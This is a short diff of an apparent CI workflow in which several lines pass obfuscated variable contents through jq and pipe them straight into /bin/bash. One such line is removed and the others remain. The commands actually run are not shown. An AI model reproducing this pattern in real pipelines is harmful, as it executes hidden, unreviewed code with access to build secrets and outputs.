@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$gfc137" | jq -r .dlzlq5248 | /bin/bash
           echo $quael8 | jq -r .rju4 | /bin/bash
           printf '%s' "$qlsmm45588" | jq -r .iaw248 | /bin/bash
-          echo $jmpx182 | jq -r .esj62173 | /bin/bash
           echo $skic174 | jq -r .bd2130 | /bin/bash
 
       - name: Upload output
